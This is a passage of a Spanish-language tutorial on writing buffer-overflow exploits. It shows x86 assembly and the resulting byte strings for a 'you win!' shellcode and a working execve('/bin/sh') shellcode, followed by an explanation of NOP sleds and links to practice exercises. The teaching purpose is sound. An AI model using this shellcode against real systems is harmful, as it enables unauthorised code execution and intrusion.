 8048083: 6e                    outs   dx,BYTE PTR ds:[esi]  <span class="p">;</span> <span class="se">\x</span>6e <span class="o">=</span> <span class="s2">"n"</span>
 8048084: 21                    .byte 0x21                   <span class="p">;</span> <span class="se">\x</span>21 <span class="o">=</span> <span class="s2">"!"</span>
 8048085: 41                    inc    ecx                   <span class="p">;</span> <span class="se">\x</span>41 <span class="o">=</span> <span class="s2">"A"</span>
   
</code></pre></div>    </div>
    <p>Es posible ver como el string es interpretado como instrucciones; es necesario obviarlas y convertir a ASCII el código máquina para verificar el texto “you win!A”</p>
  </li>
</ol>

<p>En todos los casos el shellcode como string que vamos a usar en los exploits para imprimir el mensaje “you win!” va a ser:</p>
<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>   shellcode  <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">16</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">59</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">04</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">43"</span>
   shellcode +<span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">b2</span><span class="se">\x</span><span class="s2">09</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">01</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">e5"</span>
   shellcode +<span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">79</span><span class="se">\x</span><span class="s2">6f</span><span class="se">\x</span><span class="s2">75</span><span class="se">\x</span><span class="s2">20</span><span class="se">\x</span><span class="s2">77</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">21</span><span class="se">\x</span><span class="s2">41"</span>           
</code></pre></div></div>

<h4 id="shellcode-para-lograr-una-shell">Shellcode para lograr una shell</h4>
<p>El siguiente código de ejemplo fue tomado del libro <a href="#material-consultado">Hacking the art of exploitation</a>.
Suponiendo que queremos obtener una shell con nuestro shellcode, de manera similar al siguiente programa en C:</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;unistd.h&gt;
</span> 
<span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
	<span class="kt">char</span> <span class="n">filename</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">;</span>
	<span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="o">**</span><span class="n">envp</span><span class="p">;</span>

	<span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">filename</span><span class="p">;</span>             <span class="c1">// único argumento: nombre del programa</span>
	<span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                    <span class="c1">// \0 fin del array de argumentos</span>

	<span class="n">envp</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                    <span class="c1">// \0 fin del array de entorno</span>

	<span class="n">execve</span><span class="p">(</span><span class="n">filename</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<ol>
  <li>Código en assembler:
<code class="highlighter-rouge">shellcode.asm</code>
    <pre><code class="language-asm">     section .text
       global _start

      _start:
+---&lt;   jmp short dummy        ; 1.
| 
|  -&gt; shellcode:               ; 3.
|  |    xor eax,eax            ; eax = 0
|  |    pop ebx                ; ebx =&gt; "/bin/shABBBBCCCC"
|  |    mov [ebx+7], al        ; execve("/bin/sh\0", BBBB, CCCC).
|  |    mov [ebx+8], ebx       ; execve("/bin/sh\0", &amp;"/bin/sh", CCCC). [ebx+8]: argv
|  |    mov [ebx+12],eax       ; execve("/bin/sh\0", &amp;"/bin/sh", 0000). [ebx+12]: envp
|  |  
|  |    lea ecx, [ebx+8]       ; ecx = argv
|  |    lea edx, [ebx+12]      ; edx = envp
|  |    mov al,11              ; syscall execve: #11
|  |    int 0x80               ; execve("/bin/sh\0", &amp;"/bin/sh", 0000)
|  |    
|  |    mov al,1               ; syscall exit: #1
|  |    xor ebx, ebx           ; ebx = 0
|  |    int 0x80               ; exit(0)
|  |
--&gt;|  dummy:                   ; 2.
   +--&lt; call shellcode         ; apilo addr "/bin/shABBBBCCCC"
        db '/bin/shABBBBCCCC'  ; execve(/bin/shA, BBBB, CCCC);
</code></pre>
  </li>
  <li>Shellcode como string
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>user@abos:~<span class="nv">$ </span>nasm <span class="nt">-f</span> elf shellcode.asm                               <span class="p">;</span> ensamblamos
user@abos:~<span class="nv">$ </span>ld <span class="nt">-N</span> shellcode.o <span class="nt">-o</span> shellcode                          <span class="p">;</span> linkeamos
user@abos:~<span class="nv">$ </span>objcopy <span class="nt">-j</span> .text <span class="nt">-O</span> binary shellcode.o shellcode.bin    <span class="p">;</span> extraemos section .text 
user@abos:~<span class="nv">$ </span>hexdump <span class="nt">-v</span> <span class="nt">-e</span> <span class="s1">'"\\" 1/1 "x%02x"'</span> shellcode.bin<span class="p">;</span> <span class="nb">echo</span>    <span class="p">;</span> extraemos byte code de binario
<span class="se">\x</span>eb<span class="se">\x</span>1e<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>5b<span class="se">\x</span>88<span class="se">\x</span>43<span class="se">\x</span>07<span class="se">\x</span>89<span class="se">\x</span>5b<span class="se">\x</span>08<span class="se">\x</span>89<span class="se">\x</span>43<span class="se">\x</span>0c<span class="se">\x</span>8d<span class="se">\x</span>4b<span class="se">\x</span>08<span class="se">\x</span>8d<span class="se">\x</span>53<span class="se">\x</span>0c<span class="se">\x</span>31<span class="se">\x</span>d2<span class="se">\x</span>b0<span class="se">\x</span>0b<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>b0<span class="se">\x</span>01<span class="se">\x</span>31<span class="se">\x</span>db<span class="se">\x</span><span class="nb">cd</span><span class="se">\x</span>80<span class="se">\x</span>e8<span class="se">\x</span><span class="nb">dd</span><span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>ff<span class="se">\x</span>2f<span class="se">\x</span>62<span class="se">\x</span>69<span class="se">\x</span>6e<span class="se">\x</span>2f<span class="se">\x</span>73<span class="se">\x</span>68<span class="se">\x</span>41<span class="se">\x</span>42<span class="se">\x</span>42<span class="se">\x</span>42<span class="se">\x</span>42<span class="se">\x</span>43<span class="se">\x</span>43<span class="se">\x</span>43<span class="se">\x</span>43
</code></pre></div>    </div>
    <p>El shellcode como string que vamos a usar en los exploits para obtener una shell va a ser:</p>
    <div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>shellcode  <span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">eb</span><span class="se">\x</span><span class="s2">1e</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">c0</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">88</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">07</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">5b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">89</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">0c"</span>
shellcode +<span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">4b</span><span class="se">\x</span><span class="s2">08</span><span class="se">\x</span><span class="s2">8d</span><span class="se">\x</span><span class="s2">53</span><span class="se">\x</span><span class="s2">0c</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">d2</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">0b</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">b0</span><span class="se">\x</span><span class="s2">01"</span>
shellcode +<span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">31</span><span class="se">\x</span><span class="s2">db</span><span class="se">\x</span><span class="s2">cd</span><span class="se">\x</span><span class="s2">80</span><span class="se">\x</span><span class="s2">e8</span><span class="se">\x</span><span class="s2">dd</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">ff</span><span class="se">\x</span><span class="s2">2f</span><span class="se">\x</span><span class="s2">62</span><span class="se">\x</span><span class="s2">69</span><span class="se">\x</span><span class="s2">6e</span><span class="se">\x</span><span class="s2">2f"</span>
shellcode +<span class="o">=</span> <span class="s2">"</span><span class="se">\x</span><span class="s2">73</span><span class="se">\x</span><span class="s2">68</span><span class="se">\x</span><span class="s2">41</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">42</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43</span><span class="se">\x</span><span class="s2">43"</span>          
</code></pre></div>    </div>
  </li>
</ol>

<p>Acá se presentan dos ejemplos de shellcodes, sin dudas existen muchas variantes de estos shellcodes que logran el mismo objetivo.</p>

<h3 id="tobogán-de-nops">Tobogán de NOPs</h3>
<p>Una dificultad a la hora de ejecutar el shellcode radica en saber exactamente en qué dirección de memoria se encuentra.   <br />
Para evitar errarle por pocos bytes se usa como recurso la instrucción No-Op o NOP (No Operation instruction). Cada NOP ocupa un byte (0x90 en Assembler) y es una instrucción que no hace nada, sólo avanza el contador del programa a la siguiente instrucción a ejecutar.    <br />
Si se agregan varias instrucciones NOP (formando un <code class="highlighter-rouge">NOP sled</code> o tobogán de Nops que -sin hacer nada- lleven hacia la ejecución del shellcode) y se modifica el flujo de ejecución para que salte allí, sabemos que eventualmente el shellcode se va a ejecutar.   <br />
Esto permite tener margen de error al definir la dirección de retorno y aumenta las chances de ejecutar el shellcode.</p>

<p><img src="/guia-escritura-exploits/buffer-overflow/imagenes/nops.png" alt="nops" /></p>

<h3 id="práctica">Práctica</h3>
<p>Con los contenidos vistos hasta el momento es posible avanzar con <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/stack4.c">Stack 4</a>, <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/stack5.c">Stack 5</a> y <a href="https://github.com/gerasdf/InsecureProgramming/blob/master/exercises/abo1.c">Abo 1</a>.    <br />
Y está disponible una práctica guiada para la <a href="/guia-escritura-exploits/buffer-overflow/2-practica.html">resolución de Stack 4 y 5 a través del ataque “Smash the stack”</a>.</p>

<h2 id="material-consultado">Material consultado</h2>
<p>[1]. Anley, C., Heasman, J., Linder, F., Richarte, G. (2007). The Shellcoder’s Handbook: Discovering and Exploiting Security Holes.   <br />
[2]. Erickson, Jon. (2008). Hacking: the art of exploitation.   <br />
[3]. D’Antoine, Sophia. (2015). Shellcoding: Modern Binary Exploitation CSCI 4968. Disponible en: http://security.cs.rpi.edu/courses/binexp-spring2015/lectures/7/05_lecture.pdf</p>


</div>

    </div>

  </body>
</html>
